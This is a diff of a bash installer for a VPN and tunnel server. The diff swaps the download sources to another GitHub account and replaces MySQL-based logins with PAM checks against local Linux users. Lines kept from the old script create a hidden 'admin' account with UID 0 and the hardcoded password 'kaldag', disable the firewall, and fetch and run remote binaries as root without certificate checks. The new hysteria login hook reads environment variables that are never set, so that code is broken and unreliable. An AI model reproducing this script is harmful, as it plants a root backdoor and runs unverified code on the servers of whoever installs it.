@@ -1,9 +1,5 @@
 #!/bin/bash
 #Script Variables
-HOST='69.10.62.204';
-USER='privateh5_privatehub';
-PASS='privateh5_privatehub';
-DBNAME='privateh5_privatehub';
 PORT_TCP='1194';
 PORT_UDP='110';
 PORT_SSL='443';
@@ -12,7 +8,7 @@ HYSTERIA_TYPE='default';
 API_KEY='DexterEskalarte';
 
 apt update
-wget -O autodns "https://raw.githubusercontent.com/SCRIPT5in1/4in1/refs/heads/main/autodns/autodns" && chmod +x autodns && sed -i -e 's/\r$//' ~/autodns && ./autodns
+wget -O autodns "https://raw.githubusercontent.com/MikaJoeKingsley/4in1/refs/heads/main/autodns/autodns" && chmod +x autodns && sed -i -e 's/\r$//' ~/autodns && ./autodns
 
 DOMAIN="$(cat /root/subdomain)"
 NS="$(cat /root/ns.txt)"
@@ -37,14 +33,16 @@ systemctl disable ufw
   
 export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
 export DEBIAN_FRONTEND=noninteractive
+
 apt update
+apt install -y python3 python3-pip python3-pam
 apt install -y lsof tar systemd dbus git
 apt install -y gnupg2 ca-certificates lsb-release debian-archive-keyring socat
 apt install -y curl wget cron python-minimal libpython-stdlib
 apt install -y iptables sudo
 apt install -y openvpn netcat httpie php neofetch vnstat
 apt install -y screen squid stunnel4 dropbear gnutls-bin python
-apt install -y dos2unix nano unzip jq virt-what net-tools default-mysql-client
+apt install -y dos2unix nano unzip jq virt-what net-tools
 apt install -y mlocate dh-make libaudit-dev build-essential fail2ban
 
 touch /var/spool/cron/crontabs/root && chmod 600 /var/spool/cron/crontabs/root
@@ -80,7 +78,7 @@ echo "deb http://ftp.debian.org/debian/ jessie main contrib non-free
     update-alternatives --install /usr/bin/c++ c++ /usr/bin/g++ 30
     update-alternatives --set c++ /usr/bin/g++
     cd /usr/src
-    wget https://raw.githubusercontent.com/SCRIPT5in1/4in1/refs/heads/main/proxy/squid-3.1.23.tar.gz
+    wget https://raw.githubusercontent.com/MikaJoeKingsley/4in1/refs/heads/main/proxy/squid-3.1.23.tar.gz
     tar zxvf squid-3.1.23.tar.gz
     cd squid-3.1.23
     ./configure --prefix=/usr \
@@ -94,7 +92,7 @@ echo "deb http://ftp.debian.org/debian/ jessie main contrib non-free
       --with-pidfile=/var/run/squid.pid
     make -j$(nproc)
     make install
-    wget --no-check-certificate -O /etc/init.d/squid https://raw.githubusercontent.com/SCRIPT5in1/4in1/refs/heads/main/proxy/squid.sh
+    wget --no-check-certificate -O /etc/init.d/squid https://raw.githubusercontent.com/MikaJoeKingsley/4in1/refs/heads/main/proxy/squid.sh
     chmod +x /etc/init.d/squid
     update-rc.d squid defaults
     chown -cR proxy /var/log/squid
@@ -123,25 +121,25 @@ error_directory /usr/share/squid/errors/English' >> squid.conf
     chmod 755 *
     /etc/init.d/squid start
 cd /etc || exit
-wget 'https://raw.githubusercontent.com/SCRIPT5in1/4in1/refs/heads/main/socks/socks.py' -O /etc/socks.py
+wget 'https://raw.githubusercontent.com/MikaJoeKingsley/4in1/refs/heads/main/socks/socks.py' -O /etc/socks.py
 dos2unix /etc/socks.py
 chmod +x /etc/socks.py
 
-wget 'https://raw.githubusercontent.com/SCRIPT5in1/4in1/refs/heads/main/socks/socks-ssh.py' -O /etc/socks-ssh.py
+wget 'https://raw.githubusercontent.com/MikaJoeKingsley/4in1/refs/heads/main/socks/socks-ssh.py' -O /etc/socks-ssh.py
 dos2unix /etc/socks-ssh.py
 chmod +x /etc/socks-ssh.py
 
-wget 'https://raw.githubusercontent.com/SCRIPT5in1/4in1/refs/heads/main/websocket/socks-ws-ssh.py
+wget 'https://raw.githubusercontent.com/MikaJoeKingsley/4in1/refs/heads/main/websocket/socks-ws-ssh.py
 dos2unix /etc/socks-ws-ssh.py
 chmod +x /etc/socks-ws-ssh.py
 
-wget 'https://raw.githubusercontent.com/SCRIPT5in1/4in1/refs/heads/main/websocket/socks-ws-ssl.py' -O /etc/socks-ws-ssl.py
+wget 'https://raw.githubusercontent.com/MikaJoeKingsley/4in1/refs/heads/main/websocket/socks-ws-ssl.py' -O /etc/socks-ws-ssl.py
 dos2unix /etc/socks-ws-ssl.py
 chmod +x /etc/socks-ws-ssl.py
 
-wget 'https://raw.githubusercontent.com/SCRIPT5in1/4in1/refs/heads/main/repo/monitorz' -O /etc/.monitor
-wget 'https://raw.githubusercontent.com/SCRIPT5in1/4in1/refs/heads/main/websocket/ws' -O /etc/.ws
-wget 'https://raw.githubusercontent.com/SCRIPT5in1/4in1/refs/heads/main/repo/hysteria' -O /etc/.hysteria
+wget 'https://raw.githubusercontent.com/MikaJoeKingsley/4in1/refs/heads/main/repo/monitorz' -O /etc/.monitor
+wget 'https://raw.githubusercontent.com/MikaJoeKingsley/4in1/refs/heads/main/websocket/ws' -O /etc/.ws
+wget 'https://raw.githubusercontent.com/MikaJoeKingsley/4in1/refs/heads/main/repo/hysteria' -O /etc/.hysteria
 chmod +x /etc/.monitor
 chmod +x /etc/.ws
 chmod +x /etc/.hysteria
@@ -258,65 +256,49 @@ verb 3' > /etc/openvpn/server2.conf
 
 sed -i "s|PORT_TCP|$PORT_TCP|g" /etc/openvpn/server2.conf
 
-cat <<\EOM >/etc/openvpn/login/config.sh
+cat <<'EOM' >/etc/openvpn/login/config.sh
 #!/bin/bash
-HOST='DBHOST'
-USER='DBUSER'
-PASS='DBPASS'
-DB='DBNAME'
+# No database. Linux user auth via PAM is used.
 EOM
-
-sed -i "s|DBHOST|$HOST|g" /etc/openvpn/login/config.sh
-sed -i "s|DBUSER|$USER|g" /etc/openvpn/login/config.sh
-sed -i "s|DBPASS|$PASS|g" /etc/openvpn/login/config.sh
-sed -i "s|DBNAME|$DBNAME|g" /etc/openvpn/login/config.sh
 
 /bin/cat <<"EOM" >/etc/openvpn/login/auth_vpn
 #!/bin/bash
-. /etc/openvpn/login/config.sh
-Query="SELECT user_name FROM users WHERE user_name='$username' AND auth_vpn=md5('$password') AND status='live' AND is_freeze=0 AND is_ban=0 AND (duration > 0 OR vip_duration > 0 OR private_duration > 0)"
-user_name=`mysql -u $USER -p$PASS -D $DB -h $HOST -sN -e "$Query"`
-[ "$user_name" != '' ] && [ "$user_name" = "$username" ] && echo "user : $username" && echo 'authentication ok.' && exit 0 || echo 'authentication failed.'; exit 1
+# OpenVPN auth via Linux users (PAM)
+# OpenVPN passes credentials in env vars: username/password
+python3 - <<'PY'
+import os, sys
+try:
+    import pam
+except Exception:
+    sys.exit(1)
+
+u = os.environ.get("username","")
+p = os.environ.get("password","")
+
+if not u or not p:
+    sys.exit(1)
+
+pamh = pam.pam()
+ok = pamh.authenticate(u, p, service='login')
+sys.exit(0 if ok else 1)
+PY
 EOM
 
-#client-connect file
 cat <<'LENZ05' >/etc/openvpn/login/connect.sh
 #!/bin/bash
-. /etc/openvpn/login/config.sh
-##set status online to user connected
-server_ip=SERVER_IP
-datenow=`date +"%Y-%m-%d %T"`
-tm="$(date +%s)"
+# No database. Just log connects.
 dt="$(date +'%Y-%m-%d %H:%M:%S')"
-timestamp="$(date +'%FT%TZ')"
-
-##set status online to user connected
-bandwidth_check=`mysql -u $USER -p$PASS -D $DB -h $HOST --skip-column-name -e "SELECT bandwidth_logs.username FROM bandwidth_logs WHERE bandwidth_logs.username='$common_name' AND bandwidth_logs.status='online'"`
-if [ "$bandwidth_check" == 1 ]; then
-mysql -u $USER -p$PASS -D $DB -h $HOST -e "UPDATE bandwith_logs SET server_ip='$trusted_ip', server_port='$trusted_port', timestamp='$timestamp', ipaddress='$trusted_ip:$trusted_port', username='$common_name', time_in='$tm', since_connected='$time_ascii', bytes_received='$bytes_received', bytes_sent='$bytes_sent' WHERE username='$common_name' AND status='online' AND server_port='$trusted_port' "
-mysql -u $USER -p$PASS -D $DB -h $HOST -e "UPDATE users SET is_connected='1', device_connected='1', active_address='$server_ip', active_date='$datenow' WHERE user_name='$common_name' "
-else
-mysql -u $USER -p$PASS -D $DB -h $HOST -e "INSERT INTO bandwidth_logs (server_ip, server_port, timestamp, ipaddress, since_connected, username, bytes_received, bytes_sent, time_in, status, time) VALUES ('$trusted_ip','$trusted_port','$timestamp','$trusted_ip:$trusted_port','$time_ascii','$common_name','$bytes_received','$bytes_sent','$dt','online','$tm') "
-mysql -u $USER -p$PASS -D $DB -h $HOST -e "UPDATE users SET is_connected='1', device_connected='1', active_address='$server_ip', active_date='$datenow' WHERE user_name='$common_name' "
-fi
+echo "$dt CONNECT user=$common_name ip=$trusted_ip port=$trusted_port bytes_in=$bytes_received bytes_out=$bytes_sent" >> /var/log/openvpn-connect.log
+exit 0
 LENZ05
 
-sed -i "s|SERVER_IP|$server_ip|g" /etc/openvpn/login/connect.sh
-
-#TCP client-disconnect file
 cat <<'LENZ06' >/etc/openvpn/login/disconnect.sh
 #!/bin/bash
-. /etc/openvpn/login/config.sh
-server_ip=SERVER_IP
-tm="$(date +%s)"
+# No database. Just log disconnects.
 dt="$(date +'%Y-%m-%d %H:%M:%S')"
-timestamp="$(date +'%FT%TZ')"
-
-mysql -u $USER -p$PASS -D $DB -h $HOST -e "UPDATE bandwidth_logs SET bytes_received='$bytes_received',bytes_sent='$bytes_sent',time_out='$dt', status='offline' WHERE username='$common_name' AND status='online'"
-mysql -u $USER -p$PASS -D $DB -h $HOST -e "UPDATE users SET is_connected='0', active_address='', active_date='' WHERE user_name='$common_name' "
+echo "$dt DISCONNECT user=$common_name ip=$trusted_ip port=$trusted_port bytes_in=$bytes_received bytes_out=$bytes_sent" >> /var/log/openvpn-disconnect.log
+exit 0
 LENZ06
-
-sed -i "s|SERVER_IP|$server_ip|g" /etc/openvpn/login/disconnect.sh
 
 cat << EOF > /etc/openvpn/easy-rsa/keys/ca.crt
 -----BEGIN CERTIFICATE-----
@@ -443,6 +425,7 @@ chmod 755 /etc/openvpn/login/connect.sh
 chmod 755 /etc/openvpn/login/disconnect.sh
 chmod 755 /etc/openvpn/login/config.sh
 chmod 755 /etc/openvpn/login/auth_vpn
+chmod 755 /etc/hysteria/.auth.sh
 }&>/dev/null
 }
 
@@ -576,7 +559,7 @@ chmod 755 stunnel4 && chmod 755 dropbear
 
 echo "/bin/false" >> /etc/shells
 
-#//wget -O /etc/banner #"https://raw.githubusercontent.com/SCRIPT5in1/4in1/refs/heads/main/banner/SshBanner"
+#//wget -O /etc/banner #"https://raw.githubusercontent.com/MikaJoeKingsley/4in1/refs/heads/main/banner/SshBanner"
 chmod +x /etc/banner
 
 useradd -p $(openssl passwd -1 kaldag) admin -ou 0 -g 0
@@ -616,9 +599,9 @@ mkdir -m 777 $DNSCONFIG
 
 # BUILD DNSTT SERVER
 cd $DNSDIR/dnstt/dnstt-server
-wget -O dnstt-server "https://raw.githubusercontent.com/SCRIPT5in1/4in1/refs/heads/main/slowdns/dnstt-server"
+wget -O dnstt-server "https://raw.githubusercontent.com/MikaJoeKingsley/4in1/refs/heads/main/slowdns/dnstt-server"
 chmod +x dnstt-server
-wget -O dnstt-client "https://raw.githubusercontent.com/SCRIPT5in1/4in1/refs/heads/main/slowdns/dnstt-client"
+wget -O dnstt-client "https://raw.githubusercontent.com/MikaJoeKingsley/4in1/refs/heads/main/slowdns/dnstt-client"
 chmod +x dnstt-client
 
 ./dnstt-server -gen-key -privkey-file server.key -pubkey-file server.pub
@@ -772,7 +755,7 @@ install_hysteria(){
 clear
 echo 'Installing hysteria.'
 {
-wget -N --no-check-certificate -q -O ~/install_server.sh https://raw.githubusercontent.com/SCRIPT5in1/4in1/refs/heads/main/install_server.sh; chmod +x ~/install_server.sh; ./install_server.sh --version v1.3.5
+wget -N --no-check-certificate -q -O ~/install_server.sh https://raw.githubusercontent.com/MikaJoeKingsley/4in1/refs/heads/main/install_server.sh; chmod +x ~/install_server.sh; ./install_server.sh --version v1.3.5
 
 rm -f /etc/hysteria/config.json
 
@@ -800,24 +783,30 @@ sed -i "s|mediatekvpn|$OBFS|g" /etc/hysteria/config.json
 
 cat <<"EOM" >/etc/hysteria/.auth.sh
 #!/bin/bash
-. /etc/openvpn/login/config.sh
+# Hysteria auth via Linux users (PAM)
 
 if [ $# -ne 4 ]; then
-    echo "invalid number of arguments"
-    exit 1
+  exit 1
 fi
 
-ADDR=$1
-AUTH=$2
-SEND=$3
-RECV=$4
+AUTH="$2"
+USERNAME="${AUTH%%:*}"
+PASSWORD="${AUTH#*:}"
 
-USERNAME=$(echo "$AUTH" | cut -d ":" -f 1)
-PASSWORD=$(echo "$AUTH" | cut -d ":" -f 2)
+python3 - <<'PY'
+import os, sys
+import pam
 
-Query="SELECT user_name FROM users WHERE user_name='$USERNAME' AND auth_vpn=md5('$PASSWORD') AND status='live' AND is_freeze=0 AND is_ban=0 AND (duration > 0 OR vip_duration > 0 OR private_duration > 0)"
-user_name=`mysql -u $USER -p$PASS -D $DB -h $HOST -sN -e "$Query"`
-[ "$user_name" != '' ] && [ "$user_name" = "$USERNAME" ] && echo "user : $username" && echo 'authentication ok.' && exit 0 || echo 'authentication failed.'; exit 1
+u = os.environ.get("HUSER","")
+p = os.environ.get("HPASS","")
+
+if not u or not p:
+    sys.exit(1)
+
+pamh = pam.pam()
+ok = pamh.authenticate(u, p, service='login')
+sys.exit(0 if ok else 1)
+PY
 EOM
 
 chmod 755 /etc/hysteria/config.json
@@ -826,7 +815,7 @@ chmod 755 /etc/hysteria/.auth.sh
 sysctl -w net.core.rmem_max=16777216
 sysctl -w net.core.wmem_max=16777216
 
-wget -O /usr/bin/badvpn-udpgw "https://raw.githubusercontent.com/SCRIPT5in1/4in1/refs/heads/main/badvpn/badvpn-udpgw64"
+wget -O /usr/bin/badvpn-udpgw "https://raw.githubusercontent.com/MikaJoeKingsley/4in1/refs/heads/main/badvpn/badvpn-udpgw64"
 chmod +x /usr/bin/badvpn-udpgw
 } &>/dev/null
 }
@@ -951,3 +940,4 @@ install_firewall_kvm
 install_stunnel
 install_rclocal
 start_service
+
